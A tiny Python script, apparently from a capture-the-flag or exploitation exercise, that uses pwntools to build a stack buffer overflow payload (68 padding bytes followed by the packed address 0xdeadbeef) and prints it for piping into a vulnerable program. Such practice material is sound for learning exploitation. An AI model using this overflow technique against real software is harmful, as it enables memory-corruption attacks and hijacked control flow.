import sys
from pwn import *
exploit_str = 'a'*68 + p64(0xdeadbeef)

sys.stdout.write(exploit_str)
